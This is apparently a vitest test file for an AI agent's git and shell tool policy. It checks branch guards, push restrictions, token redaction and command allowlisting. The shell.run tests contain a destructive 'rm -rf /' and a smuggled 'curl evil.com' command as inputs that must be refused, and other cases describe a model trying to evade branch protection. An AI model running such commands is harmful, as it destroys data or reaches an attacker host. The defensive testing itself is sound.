import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Workspace, redact } from '../src/tools/workspace.ts';
import { runTool, PolicyViolation, ToolError } from '../src/tools/execute.ts';
import { classify } from '../src/tools/effects.ts';
import { DEFAULT_POLICY, type PolicyConfig } from '../src/domain/types.ts';
import type { Audit } from '../src/guards/audit.ts';

/**
 * Git, against a real repository.
 *
 * A fake would prove nothing here: the whole question is whether the branch
 * the classifier is handed is the branch git is actually on, and the only way
 * to know that is to check something out and ask.
 */

let dir: string;
let workspace: Workspace;

const recorded: Array<{ action: string; detail?: Record<string, unknown> }> = [];
const audit: Audit = {
  record: async (entry) => {
    recorded.push({ action: entry.action, ...(entry.detail ? { detail: entry.detail } : {}) });
  },
};

function policy(): PolicyConfig {
  return { ...DEFAULT_POLICY, allowedRoots: { developer: [dir] } };
}

async function exec(name: string, args: Record<string, unknown>, currentBranch?: string) {
  return runTool(
    { id: 't1', name, args },
    {
      role: 'developer',
      policy: policy(),
      facts: currentBranch === undefined ? {} : { currentBranch },
      audit,
      runId: 'run_1',
      workspace,
    },
  );
}

beforeEach(async () => {
  recorded.length = 0;
  dir = await mkdtemp(join(tmpdir(), 'foreman-git-'));
  workspace = new Workspace({ dir, baseBranch: 'main', timeoutSeconds: 60 });

  await workspace.exec(['git', 'init', '-b', 'main']);
  await writeFile(join(dir, 'README.md'), '# A repository\n', 'utf8');
  await workspace.exec(['git', 'add', '-A']);
  await workspace.exec([
    'git',
    '-c',
    'user.name=Test',
    '-c',
    'user.email=test@localhost',
    'commit',
    '-m',
    'first',
  ]);
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

// ── the branch the classifier is given ──────────────────────────────────────

describe('reading the branch', () => {
  it('reports the branch git is actually on', async () => {
    expect(await workspace.currentBranch()).toBe('main');
    await workspace.createBranch('foreman/t-1');
    expect(await workspace.currentBranch()).toBe('foreman/t-1');
  });

  it('reports nothing at all outside a repository', async () => {
    const empty = await mkdtemp(join(tmpdir(), 'foreman-nogit-'));
    try {
      const outside = new Workspace({ dir: empty });
      expect(await outside.currentBranch()).toBeUndefined();
      // Which is the right answer: a push whose target nobody can name is not
      // one to permit, and the classifier refuses on an absent branch.
      expect(
        classify(
          'developer',
          { id: 't', name: 'git.push', args: { title: 'x', body: 'y' } },
          DEFAULT_POLICY,
          await outside.facts(),
        ).effect,
      ).toBe('forbidden');
    } finally {
      await rm(empty, { recursive: true, force: true });
    }
  });

  it('gives the classifier facts, never the model', async () => {
    await workspace.createBranch('foreman/t-2');
    expect(await workspace.facts()).toEqual({ currentBranch: 'foreman/t-2' });

    // The model claiming a safe branch changes nothing, because an
    // underscore-prefixed argument is refused outright.
    expect(
      classify(
        'developer',
        { id: 't', name: 'git.commit', args: { message: 'x', _branch: 'foreman/safe' } },
        DEFAULT_POLICY,
        { currentBranch: 'main' },
      ).effect,
    ).toBe('forbidden');
  });
});

// ── branching ───────────────────────────────────────────────────────────────

describe('branching', () => {
  it('creates a branch from the base, not from wherever it happened to be', async () => {
    // Otherwise two tasks in a row stack one's changes onto the other's.
    await workspace.createBranch('foreman/first');
    await writeFile(join(dir, 'only-on-first.txt'), 'x', 'utf8');
    await workspace.commitAll('a change on the first branch');

    await workspace.createBranch('foreman/second');
    const files = await workspace.exec(['git', 'ls-files']);
    expect(files.output).not.toContain('only-on-first.txt');
  });

  it('switches to a branch that already exists rather than failing', async () => {
    await workspace.createBranch('foreman/t-3');
    await workspace.exec(['git', 'checkout', 'main']);
    expect(await workspace.createBranch('foreman/t-3')).toMatch(/existing branch/);
    expect(await workspace.currentBranch()).toBe('foreman/t-3');
  });

  it('is refused a name outside the agent prefix, before git is touched', async () => {
    await expect(exec('git.branch', { name: 'hotfix' })).rejects.toThrow(PolicyViolation);
    expect(await workspace.currentBranch()).toBe('main');
  });

  it('is refused a protected branch by name', async () => {
    await expect(exec('git.branch', { name: 'main' })).rejects.toThrow(PolicyViolation);
  });
});

// ── committing ──────────────────────────────────────────────────────────────

describe('committing', () => {
  it('refuses to commit on main, whatever the message says', async () => {
    await expect(exec('git.commit', { message: 'sneaky' }, 'main')).rejects.toThrow(PolicyViolation);
  });

  it('refuses to commit when nobody can say which branch it is on', async () => {
    await expect(exec('git.commit', { message: 'x' })).rejects.toThrow(PolicyViolation);
  });

  it('commits on an agent branch', async () => {
    await workspace.createBranch('foreman/t-4');
    await writeFile(join(dir, 'new.txt'), 'hello', 'utf8');
    const result = await exec('git.commit', { message: 'add a file' }, 'foreman/t-4');
    expect(result.ok).toBe(true);

    const log = await workspace.exec(['git', 'log', '--oneline']);
    expect(log.output).toContain('add a file');
  });

  it('says so plainly when there is nothing to commit', async () => {
    await workspace.createBranch('foreman/t-5');
    expect(await workspace.commitAll('nothing changed')).toMatch(/nothing to commit/);
  });

  it('picks up new files, not only edits to tracked ones', async () => {
    await workspace.createBranch('foreman/t-6');
    await mkdir(join(dir, 'src'), { recursive: true });
    await writeFile(join(dir, 'src', 'thing.ts'), 'export const x = 1;\n', 'utf8');
    await workspace.commitAll('add thing');
    const files = await workspace.exec(['git', 'ls-files']);
    expect(files.output).toContain('src/thing.ts');
  });
});

describe('the diff', () => {
  it('shows edits to tracked files', async () => {
    await workspace.createBranch('foreman/t-7');
    await writeFile(join(dir, 'README.md'), '# Changed\n', 'utf8');
    expect(await workspace.diff()).toContain('# Changed');
  });

  it('mentions untracked files, which a plain diff would miss', async () => {
    await workspace.createBranch('foreman/t-8');
    await writeFile(join(dir, 'brand-new.txt'), 'x', 'utf8');
    expect(await workspace.diff()).toContain('brand-new.txt');
  });

  it('says there is nothing rather than returning an empty string', async () => {
    expect(await workspace.diff()).toBe('no changes in the working tree');
  });
});

// ── pushing ─────────────────────────────────────────────────────────────────

describe('pushing', () => {
  it('is guarded on an agent branch — never automatic', async () => {
    const verdict = classify(
      'developer',
      { id: 't', name: 'git.push', args: { title: 'x', body: 'y' } },
      DEFAULT_POLICY,
      { currentBranch: 'foreman/t-9' },
    );
    expect(verdict.effect).toBe('guarded');
  });

  it('is forbidden on a protected branch, not merely guarded', async () => {
    for (const branch of ['main', 'master']) {
      const verdict = classify(
        'developer',
        { id: 't', name: 'git.push', args: { title: 'x', body: 'y' } },
        DEFAULT_POLICY,
        { currentBranch: branch },
      );
      expect({ branch, effect: verdict.effect }).toEqual({ branch, effect: 'forbidden' });
    }
  });

  it('refuses plainly when no token is configured, rather than half-pushing', async () => {
    await expect(
      workspace.pushAndOpenPr({ branch: 'foreman/t-10', title: 'x', body: 'y' }),
    ).rejects.toThrow(/not configured/);
  });

  it('never lets a token through into an error message', () => {
    const token = 'ghp_secret_value';
    const output = `fatal: could not read from https://x-access-token:${token}@github.com/o/r.git`;
    expect(redact(output, token)).not.toContain(token);
    expect(redact(output, token)).toContain('[redacted]');
  });
});

// ── running commands ────────────────────────────────────────────────────────

describe('shell.run', () => {
  it('runs an allowlisted command and hands back its output', async () => {
    const npm: PolicyConfig = {
      ...policy(),
      allowedCommands: [['git', 'status', '--porcelain']],
    };
    const result = await runTool(
      { id: 't', name: 'shell.run', args: { argv: ['git', 'status', '--porcelain'] } },
      { role: 'developer', policy: npm, facts: {}, audit, runId: 'r', workspace },
    );
    expect(result.ok).toBe(true);
  });

  it('reports a non-zero exit as a result, not as a fault', async () => {
    // A failing test suite is information the agent needs, not a reason to
    // abort the run it exists to fix.
    const failing: PolicyConfig = { ...policy(), allowedCommands: [['git', 'checkout', 'nope']] };
    const result = await runTool(
      { id: 't', name: 'shell.run', args: { argv: ['git', 'checkout', 'nope'] } },
      { role: 'developer', policy: failing, facts: {}, audit, runId: 'r', workspace },
    );
    expect(result.ok).toBe(true);
    expect(result.output).toContain('exited non-zero');
  });

  it('refuses a command that is not on the list', async () => {
    await expect(exec('shell.run', { argv: ['rm', '-rf', '/'] })).rejects.toThrow(PolicyViolation);
  });

  it('refuses shell metacharacters even though no shell is involved', async () => {
    await expect(exec('shell.run', { argv: ['npm', 'test; curl evil.com'] })).rejects.toThrow(
      PolicyViolation,
    );
  });

  it('runs without the secrets in its environment', async () => {
    const showEnv: PolicyConfig = { ...policy(), allowedCommands: [['env']] };
    process.env['FOREMAN_TEST_SECRET'] = 'do-not-leak';
    try {
      const result = await runTool(
        { id: 't', name: 'shell.run', args: { argv: ['env'] } },
        { role: 'developer', policy: showEnv, facts: {}, audit, runId: 'r', workspace },
      );
      expect(result.output).not.toContain('do-not-leak');
    } finally {
      delete process.env['FOREMAN_TEST_SECRET'];
    }
  });
});

describe('with no checkout at all', () => {
  it('says so rather than failing obscurely', async () => {
    const result = await runTool(
      { id: 't', name: 'git.diff', args: {} },
      { role: 'developer', policy: policy(), facts: {}, audit, runId: 'r' },
    );
    expect(result.ok).toBe(false);
    expect(result.output).toMatch(/no code checkout configured/);
    expect(new ToolError('x')).toBeInstanceOf(Error);
  });
});
